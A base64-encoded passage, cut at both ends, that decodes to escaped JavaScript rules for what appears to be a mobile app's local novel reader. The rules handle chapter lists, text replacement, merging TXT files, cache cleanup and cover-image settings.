xKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lt7Lnu4/mmK/mnIDlkI7kuIDpobXkuoZcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiLnBhZ2VOdW1cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIiArIGlucHV0TnVtKTtcXFxcbiAgICAgICAgICAgIGNvbnN0IGJvb2tJbmZvID0gSlNPTi5wYXJzZShyZXF1ZXN0KFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgcGF0aCArIFxcXFxcXFwiL2Jvb2tJbmZvLmpzb25cXFxcXFxcIikgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGJvb2tJbmZvLmZvb3QgPSBpbnB1dE51bTtcXFxcbiAgICAgICAgICAgIHdyaXRlRmlsZShcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHBhdGggKyBcXFxcXFxcIi9ib29rSW5mby5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGJvb2tJbmZvKSk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgIH0sIHZpZXdQYWdlQ291bnQsIHBhZ2VOdW0sIHBhdGgpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzVcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxufSBlbHNlIHtcXFxcbiAgICBjaGFwdGVyTGlzdCA9IG1obGlzdDtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgXFxcXFxcXCLnq6DoioIgXFxcXFxcXCIuYmlnKCkgKyAoXFxcXFxcXCLlhbHmnIk6XFxcXFxcXCIgKyBjaGFwdGVyQ291bnQgKyBcXFxcXFxcIueroFxcXFxcXFwiKS5zbWFsbCgpLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoaXNSZXZlcnNlKSA9PiB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcIi5pc1JldmVyc2VcXFxcXFxcIiwgaXNSZXZlcnNlID09PSBcXFxcXFxcIjBcXFxcXFxcIiA/IFxcXFxcXFwiMVxcXFxcXFwiIDogXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgfSwgaXNSZXZlcnNlKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbn1cXFxcbmxldCBhcnJheSA9IFtdO1xcXFxuaWYgKG1vZGUgPT09IFxcXFxcXFwiMFxcXFxcXFwiKSB7XFxcXG4gICAgZm9yIChsZXQgaXRlbSBvZiBjaGFwdGVyTGlzdCkge1xcXFxuICAgICAgICBsZXQgbmFtZSA9IGdldFRpdGxlKGl0ZW0ubmFtZSk7XFxcXG4gICAgICAgIGFycmF5LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IG5hbWUsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL05vdmVsTWFpbkJvZHkjYXV0b1BhZ2UjI3JlYWRUaGVtZSNcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgcGF0aDogaXRlbS5wYXRoLFxcXFxuICAgICAgICAgICAgICAgIGRpclBhdGg6IHBhdGgsXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IG5hbWUsXFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IENvbmZpZy5kZWZfVmlld19TdHlsZVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG59IGVsc2Uge1xcXFxuICAgIGZvciAobGV0IGl0ZW0gb2YgY2hhcHRlckxpc3QpIHtcXFxcbiAgICAgICAgbGV0IG5hbWUgPSBnZXRUaXRsZShpdGVtLm5hbWUpO1xcXFxuICAgICAgICBhcnJheS5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBuYW1lLFxcXFxuICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwi56Gu6K6k5Yig6ZmkW1xcXFxcXFwiICsgbmFtZSArIFxcXFxcXFwiXe+8n1xcXFxcXFwiKS5jb25maXJtKChwYXRoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChGaWxlLmRlbGV0ZUZpbGVzKHBhdGgpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKHRydWUpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WIoOmZpOaIkOWKn1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSwgaXRlbS5wYXRoKSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBDb25maWcuZGVmX1ZpZXdfU3R5bGVcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfVxcXFxufVxcXFxuaWYgKGlzUmV2ZXJzZSA9PT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgICBhcnJheS5yZXZlcnNlKCk7XFxcXG59XFxcXG5sYXlvdXQucHVzaC5hcHBseShsYXlvdXQsIGFycmF5KTtcXFxcbnNldFJlc3VsdChsYXlvdXQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiN2LuWwj+ivtOato+aWh+mYheivu1xcXCIsXFxcInBhdGhcXFwiOlxcXCJOb3ZlbE1haW5Cb2R5XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGxheW91dCA9IFtdO1xcXFxubGV0IGNvbnRlbnQgPSByZXF1ZXN0KFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgTVlfUEFSQU1TLnBhdGgpO1xcXFxuLy9jb250ZW50ID0gY29udGVudC5yZXBsYWNlKC9cXFxcXFxcXG58XFxcXFxcXFxyL2csIFxcXFxcXFwiPGJyPlxcXFxcXFwiKS5yZXBsYWNlKC8oJm5ic3A7KSsvZyxcXFxcXFxcIiBcXFxcXFxcIik7XFxcXG5jb25zdCBib29rSW5mbyA9IE9iamVjdC5hc3NpZ24oe1xcXFxuICAgIHNlbGVjdGVkOiBbXSxcXFxcbiAgICBpc1JlcGxhY2U6IGZhbHNlLFxcXFxuICAgIGlzU2VnbWVudDogdHJ1ZSxcXFxcbn0sIEpTT04ucGFyc2UocmVxdWVzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIE1ZX1BBUkFNUy5kaXJQYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpKTtcXFxcblxcXFxuaWYgKGJvb2tJbmZvLmlzUmVwbGFjZSkge1xcXFxuICAgIGxldCBqYXZhU3RyaW5nID0gamF2YS5sYW5nLlN0cmluZyhjb250ZW50KTtcXFxcbiAgICBsZXQgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwicmVwbGFjZVJ1bGUuanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgIGxldCByZXBsYWNlUGF0dGVybiA9IFtcXFxcXFxcInJlcGxhY2VcXFxcXFxcIiwgXFxcXFxcXCJyZXBsYWNlQWxsXFxcXFxcXCJdO1xcXFxuICAgIGZvciAobGV0IGkgPSAwLCBsZW4gPSBydWxlTGlzdC5sZW5ndGg7IGkgPCBsZW47IGkrKykge1xcXFxuICAgICAgICBsZXQgcmVwbGFjZVJ1bGUgPSBydWxlTGlzdFtpXTtcXFxcbiAgICAgICAgaWYgKCFib29rSW5mby5zZWxlY3RlZC5pbmNsdWRlcyhyZXBsYWNlUnVsZS5pZCkpIHtcXFxcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxldCByZXBsYWNlID0gcmVwbGFjZVBhdHRlcm5bMCArIHJlcGxhY2VSdWxlLmlzUmVnZXhdO1xcXFxuICAgICAgICBqYXZhU3RyaW5nID0gamF2YVN0cmluZ1tyZXBsYWNlXShyZXBsYWNlUnVsZS5wYXR0ZXJuLCByZXBsYWNlUnVsZS5yZXBsYWNlbWVudCk7XFxcXG4gICAgfVxcXFxuICAgIGNvbnRlbnQgPSBTdHJpbmcoamF2YVN0cmluZyk7XFxcXG59XFxcXG5pZiAoYm9va0luZm8uaXNTZWdtZW50KSB7XFxcXG4gICAgY29udGVudCA9IFxcXFxcXFwi44CA44CAXFxcXFxcXCIgKyBjb250ZW50LnNwbGl0KC8oXFxcXFxcXFxufFxcXFxcXFxccikrLykuZmlsdGVyKGl0ID0+IGl0LnRyaW0oKS5sZW5ndGggPiAxKS5tYXAoaXQgPT4gaXQudHJpbSgpKS5qb2luKFxcXFxcXFwiPGJyPuOAgOOAgFxcXFxcXFwiKTtcXFxcbn1cXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIixcXFxcbiAgICB0aXRsZTogKFxcXFxcXFwiPHN0cm9uZz5cXFxcXFxcIiArIE1ZX1BBUkFNUy50aXRsZSArIFxcXFxcXFwiPC9zdHJvbmc+XFxcXFxcXCIpLmJpZygpLFxcXFxufSk7XFxcXG5cXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogY29udGVudCxcXFxcbiAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCcsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgdGV4dFNpemU6IDE4LFxcXFxuICAgICAgICBjbGljazogdHJ1ZVxcXFxuICAgIH1cXFxcbn0pO1xcXFxuc2V0UmVzdWx0KGxheW91dCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcInRleHRfMVxcXCIsXFxcIm5hbWVcXFwiOlxcXCIjdi7lkIjlubZUWFRcXFwiLFxcXCJwYXRoXFxcIjpcXFwiTm92ZWxDb2xsZWN0ZWQudmlld1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXFxcXFwiKTtcXFxcbmNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFxcXFxcIik7XFxcXG5sZXQgcnVsZWxEaXIgPSBGaWxlLmdldEZpbGVQYXRoKENvbmZpZy5ub3ZlbEZ1bGxQYXRoLCBcXFxcXFxcImRpclxcXFxcXFwiKTtcXFxcbnNldFBhZ2VUaXRsZShcXFxcXFxcIuWQiOW5tlRYVFxcXFxcXFwiKTtcXFxcbmxldCBsYXlvdXQgPSBbXTtcXFxcblxcXFxuZnVuY3Rpb24gb3BlcmF0aW9uKHBhdGgpIHtcXFxcbiAgICBzd2l0Y2ggKGlucHV0KSB7XFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCLliIbkuqtcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInNoYXJlOi8vXFxcXFxcXCIgKyBwYXRoO1xcXFxuICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCLliKDpmaRcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgIGNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGlmIChGaWxlLmRlbGV0ZUZpbGVzKHBhdGgpKSB7XFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WIoOmZpOaIkOWKn1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WIoOmZpOWksei0pVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCLmtbfpmJTpooTop4hcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS90eHRQYXJzZXIudmlld1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCLmiZPlvIDmlrnlvI9cXFxcXFxcIjpcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcIm9wZW5GaWxlOi8vZmlsZTovL1xcXFxcXFwiICsgcGF0aDtcXFxcbiAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgIH1cXFxcbn1cXFxcbmZvciAobGV0IHJ1bGVQYXRocyBvZiBydWxlbERpcikge1xcXFxuICAgIGxldCBub3ZlbHMgPSBGaWxlLmdldEZpbGVQYXRoKHJ1bGVQYXRocy5wYXRoLCBcXFxcXFxcImZpbGVcXFxcXFxcIiwgXFxcXFxcXCIudHh0XFxcXFxcXCIpO1xcXFxuICAgIGZvciAobGV0IG5vdmVsIG9mIG5vdmVscykge1xcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogbm92ZWwubmFtZSxcXFxcbiAgICAgICAgICAgIHVybDogJChbXFxcXFxcXCLliIbkuqtcXFxcXFxcIiwgXFxcXFxcXCLliKDpmaRcXFxcXFxcIiwgXFxcXFxcXCLmtbfpmJTpooTop4hcXFxcXFxcIiwgXFxcXFxcXCLmiZPlvIDmlrnlvI9cXFxcXFxcIl0sIDEpLnNlbGVjdChvcGVyYXRpb24sIG5vdmVsLnBhdGgpLFxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLmnaXmupDvvJpcXFxcXFxcIiArIHJ1bGVQYXRocy5uYW1lLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIHBhdGg6IG5vdmVsLnBhdGhcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfVxcXFxufVxcXFxuaWYgKGxheW91dC5sZW5ndGggPT09IDApIHtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAnPGgxIHN0eWxlPVxcXFxcXFwidGV4dC1hbGlnbjogY2VudGVyO1xcXFxcXFwiPuWVpemDveayoeacieiAtjwvaDE+JyxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbn1cXFxcbnNldFJlc3VsdChsYXlvdXQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiN2LuabtOWkmuiuvue9rlxcXCIsXFxcInBhdGhcXFwiOlxcXCJTZXR0aW5nL01vcmUudmlld1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXFxcXFwiKTtcXFxcbmNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFxcXFxcIik7XFxcXG5cXFxcbmNvbnN0IHNldHRpbmdUeXBlID0gTVlfUEFSQU1TLnNldHRpbmdUeXBlIHx8IGdldFBhcmFtKFxcXFxcXFwic2V0dGluZ1R5cGVcXFxcXFxcIik7XFxcXG5cXFxcbmxldCBsYXlvdXQgPSBbXTtcXFxcbmxldCBpZCA9IFxcXFxcXFwiI1xcXFxcXFwiICsgbmV3IERhdGUoKS5nZXRUaW1lKCk7XFxcXG5zd2l0Y2ggKHNldHRpbmdUeXBlKSB7XFxcXG4gICAgY2FzZSBcXFxcXFxcImNhY2hlXFxcXFxcXCI6XFxcXG4gICAgICAgIHNldFBhZ2VUaXRsZShcXFxcXFxcIua4hemZpOe8k+WtmHzorr7nva5cXFxcXFxcIik7XFxcXG4gICAgICAgIGNvbnN0IGtub3duTGlzdCA9IG5ldyBNYXAoW1xcXFxuICAgICAgICAgICAgW0ZpbGUuZ2V0TmFtZShDb25maWcubm92ZWxQYXRoKSwgXFxcXFxcXCIj566h55CG5ZmoI+Wwj+ivtOe8k+WtmOebruW9lVvkuI3lu7rorq7muIXpmaRdXFxcXFxcXCJdLFxcXFxuICAgICAgICAgICAgW0ZpbGUuZ2V0TmFtZShDb25maWcuY29taWNQYXRoKSwgXFxcXFxcXCIj566h55CG5ZmoI+a8q+eUu+e8k+WtmOebruW9lVvkuI3lu7rorq7muIXpmaRdXFxcXFxcXCJdLFxcXFxuICAgICAgICAgICAgW0ZpbGUuZ2V0TmFtZShDb25maWcuZXh0ZXJuYWxJbXBvcnRQYXRoKSwgXFxcXFxcXCIj566h55CG5ZmoI+WvvOWFpeeahFRYVOebruW9lVvkuI3lu7rorq7muIXpmaRdXFxcXFxcXCJdLFxcXFxuICAgICAgICAgICAgW0ZpbGUuZ2V0TmFtZShDb25maWcubm92ZWxGdWxsUGF0aCksIFxcXFxcXFwiI+euoeeQhuWZqCPlsI/or7TlkIjlubbnm67lvZVb5Y+v5Lul5riF6ZmkXVxcXFxcXFwiXSxcXFxcbiAgICAgICAgICAgIFtcXFxcXFxcImRy56ug6IqC57yT5a2YXFxcXFxcXCIsIFxcXFxcXFwi6YGT6ZW/5qih5p2/5Li05pe257yT5a2YW+W7uuiurua4hemZpF1cXFxcXFxcIl1cXFxcbiAgICAgICAgXSk7XFxcXG5cXFxcbiAgICAgICAgbGV0IGNhY2hlRGlyID0gRmlsZS5nZXRGaWxlUGF0aChDb25maWcuaG9tZVBhdGgsIFxcXFxcXFwiZGlyXFxcXFxcXCIpO1xcXFxuXFxcXG4gICAgICAgIGZ1bmN0aW9uIGNsZWFuQ2FjaGUocGF0aCkge1xcXFxuICAgICAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgaWYgKEZpbGUuZGVsZXRlRmlsZXMocGF0aCkpIHtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/muIXpmaTlrozmiJBcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/muIXpmaTlpLHotKVcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBmb3IgKGxldCBjYWNoZSBvZiBjYWNoZURpcikge1xcXFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBjYWNoZS5uYW1lLFxcXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXFxcXFwi5aSn5bCP77yaXFxcXFxcXCIgKyBGaWxlLmdldEZpbGVTaXplKGNhY2hlLnBhdGgpICsgXFxcXFxcXCJcXFxcXFxcXG7mj4/ov7DvvJpcXFxcXFxcIiArIChrbm93bkxpc3QuZ2V0KGNhY2hlLm5hbWUpIHx8IFxcXFxcXFwi5pyq55+l55uu5b2VW+mjjumZqeacquefpV1cXFxcXFxcIiksXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwi56Gu6K6k5riF6ZmkIFxcXFxcXFwiICsgY2FjaGUubmFtZSArIFxcXFxcXFwiID9cXFxcXFxcIikuY29uZmlybShjbGVhbkNhY2hlLCBjYWNoZS5wYXRoKVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibGluZV9ibGFua1xcXFxcXFwiXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLlhajpg6jmuIXpmaQoXFxcXFxcXCIgKyBGaWxlLmdldEZpbGVTaXplKENvbmZpZy5ob21lUGF0aCkgKyBcXFxcXFxcIilcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogJChcXFxcXFxcIuehruiupOa4hemZpOWFqOmDqOe8k+WtmOaVsOaNrj9cXFxcXFxcIikuY29uZmlybShjbGVhbkNhY2hlLCBDb25maWcuaG9tZVBhdGgpXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBicmVhaztcXFxcbiAgICBjYXNlIFxcXFxcXFwiZGVmYXVsdFBpY1xcXFxcXFwiOlxcXFxuICAgICAgICBzZXRQYWdlVGl0bGUoXFxcXFxcXCLpu5jorqTlsIHpnaJ86K6+572uXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoZ2V0TXlWYXIoXFxcXFxcXCI6ZGVmYXVsdFBpY0JhY2tcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgIGJhY2soKTtcXFxcbiAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCI6ZGVmYXVsdFBpY0JhY2tcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgIGZ1bmN0aW9uIHNldERlZmF1bHRQaWModXJsKSB7XFxcXG4gICAgICAgICAgICBsZXQgQ29uZmlnID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFxcXFxcImNvbmZpZy5qc29uXFxcXFxcXCIsIDApIHx8IFxcXFxcXFwie31cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBDb25maWcuZGVmX1BpYyA9IHVybDtcXFxcbiAgICAgICAgICAgIHNhdmVGaWxlKFxcXFxcXFwiY29uZmlnLmpzb25cXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkoQ29uZmlnKSwgMCk7XFxcXG4gICAgICAgICAgICBiYWNrKCk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+S/ruaUueaIkOWKn1xcXFxcXFwiO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxldCBzdGFydCA9IDE7XFxcXG4gICAgICAgIGlmICh0eXBlb2YoTVlfTkFNRSkgIT09IFxcXFxcXFwidW5kZWZpbmVkXFxcXFxcXCIgJiYgTVlfTkFNRSA9PT0gXFxcXFxcXCLll4Xop4nmtY/op4jlmahcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgc3RhcnQgPSA0O1xcXFxuICAgICAgICB9ZWxzZXtcXFxcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLlm77niYdsYXRlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibW92aWVfM1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IFxcXFxcXFwiaGlrZXI6Ly9pbWFnZXMvaG9tZV9sYXRlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoc2V0RGVmYXVsdFBpYywgXFxcXFxcXCJoaWtlcjovL2ltYWdlcy9ob21lX2xhdGVcXFxcXFxcIilcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IHN0YXJ0OyBpIDw9IDQ7IGkrKykge1xcXFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuWbvueJh1xcXFxcXFwiICsgaSxcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJtb3ZpZV8zXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgcGljX3VybDogXFxcXFxcXCJoaWtlcjovL2ltYWdlcy9ob21lX3BpY1xcXFxcXFwiICsgaSxcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZShzZXREZWZhdWx0UGljLCBcXFxcXFxcImhpa2VyOi8vaW1hZ2VzL2hvbWVfcGljXFxcXFxcXCIgKyBpKVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6Ieq5a6a5LmJ4p6VXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzNcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogJChbXFxcXFxcXCLoh6rlrprkuYl1cmxcXFxcXFxcIiwgXFxcXFxcXCLpgInmi6nmlofku7bot6/lvoRcXFxcXFxcIl0pLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0ID09PSBcXFxcXFxcIuiHquWumuS5iXVybFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAkKFxcXFxcXFwiXFxcXFxcXCIsIFxcXFxcXFwi6L6T5YWl5Zu+54mH55qE6Lev5b6E5oiW6ICF6ZO+5o6lXFxcXFxcXCIpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBDb25maWcgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwiY29uZmlnLmpzb25cXFxcXFxcIiwgMCkgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5kZWZfUGljID0gaW5wdXQ7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBzYXZlRmlsZShcXFxcXFxcImNvbmZpZy5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgYmFjaygpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kv67mlLnmiJDlip9cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHJlcXVpcmVVcmwgPSBcXFxcXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTUwOTlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVTZWxlY3QgPSAkLnJlcXVpcmUocmVxdWlyZVVybCk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBmaWxlU2VsZWN0LmZpbGVTZWxlY3Rpb25Vcmkoe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2s6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBDb25maWcgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwiY29uZmlnLmpzb25cXFxcXFxcIi